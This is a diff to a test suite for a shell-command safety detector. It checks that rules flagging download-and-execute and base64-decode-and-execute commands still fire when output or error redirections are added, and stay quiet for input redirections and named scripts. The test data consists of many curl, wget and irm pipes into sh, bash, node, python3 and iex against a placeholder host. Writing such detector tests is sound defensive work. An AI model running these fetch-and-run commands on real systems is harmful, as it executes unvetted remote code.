@@ -306,6 +306,73 @@ describe("R2 download and execute", () => {
     ]);
   });
 
+  // Codex P2 4366350123: redirections aren't program arguments.
+  it("redirecting output or stderr doesn't hide a pipe into stdin execution", () => {
+    expectRule("download-execute", [
+      "curl https://example.invalid/i | sh 2>/dev/null",
+      "curl https://example.invalid/i | bash >out.log",
+      "curl https://example.invalid/i | node - 2>&1",
+      "curl https://example.invalid/i | sh 2> /dev/null",
+      "curl https://example.invalid/i | bash > out.log 2>&1",
+      "curl https://example.invalid/i | sh >>log.txt",
+      "curl https://example.invalid/i | bash &>/dev/null",
+      "curl https://example.invalid/i | sh >|forced.log",
+      "curl https://example.invalid/i | bash -s 2>/dev/null -- --install", // redirect between options
+      "curl https://example.invalid/i | 2>/dev/null bash", // redirect before the program
+      "curl https://example.invalid/i 2>/dev/null | sh", // on the downloader side
+      "curl https://example.invalid/i 2>&1 | sh", // & in 2>&1 isn't a command separator
+      "wget -qO- https://example.invalid/i 2>&1 | bash",
+      "curl https://example.invalid/i | python3 - 1>/dev/null",
+      "irm https://example.invalid/i | iex 2>$null",
+      'sh -c "curl https://example.invalid/i | sh 2>/dev/null"',
+    ]);
+    expectRule("encoded-execution", ["base64 -d payload.b64 | sh 2>/dev/null", "echo SGVsbG8= | base64 -d 2>/dev/null | bash >out"]);
+  });
+
+  it("redirecting stdout or stderr doesn't by itself mean execution", () => {
+    expectNotRule("download-execute", [
+      "curl https://example.invalid/i > out.sh",
+      "curl https://example.invalid/i 2>&1 >out.sh",
+      "curl https://example.invalid/i | tee out.sh >/dev/null",
+      "curl https://example.invalid/i | cat > out.sh",
+    ]);
+    expectNotRule("encoded-execution", ["base64 -d payload.b64 > out.bin 2>/dev/null"]);
+  });
+
+  it("an input redirection replaces the piped stdin: the program reads the file", () => {
+    expectNotRule("download-execute", [
+      "curl https://example.invalid/i | sh <local.sh",
+      "curl https://example.invalid/i | sh < local.sh",
+      "curl https://example.invalid/i | bash 0<local.sh",
+      "curl https://example.invalid/i | node - <input.js",
+      "curl https://example.invalid/i | bash <<EOF",
+      "curl https://example.invalid/i | sh <<<'echo hi'",
+      "curl https://example.invalid/i | sh <&3",
+    ]);
+    expectNotRule("encoded-execution", ["base64 -d payload.b64 | sh <local.sh"]);
+  });
+
+  it("a named script stays a named script with redirections around it", () => {
+    expectNotRule("download-execute", [
+      "curl https://example.invalid/i | node scripts/check.js 2>/dev/null",
+      "curl https://example.invalid/i | bash ./handle.sh >out.log 2>&1",
+      "curl https://example.invalid/i | 2>/dev/null python tool.py",
+      "curl https://example.invalid/i | sh -e 2> err.log tools/consume.sh",
+    ]);
+  });
+
+  it("quoted redirect-looking text is an argument, not a redirection", () => {
+    // The quoted word is a script name, so nothing is claimed.
+    expectNotRule("download-execute", ['curl https://example.invalid/i | sh "2>/dev/null"', "curl https://example.invalid/i | bash '>out'", "curl https://example.invalid/i | sh \\>out"]);
+    // Inside a -c string, the redirection is the nested command's own.
+    expectRule("download-execute", ["bash -c 'curl https://example.invalid/i | sh 2>/dev/null'"]);
+    expectNotRule("download-execute", ['echo "curl https://example.invalid/i | sh 2>/dev/null"']);
+  });
+
+  it("process substitution is still a substitution, not an input redirection", () => {
+    expectRule("download-execute", ["bash <(curl https://example.invalid/i) 2>/dev/null", "source <(curl https://example.invalid/i) >/dev/null"]);
+  });
+
   // Codex P2 #2: wget saves to a file unless told to write to stdout.
   it("wget's default and named output files aren't direct execution", () => {
     expectNotRule("download-execute", [
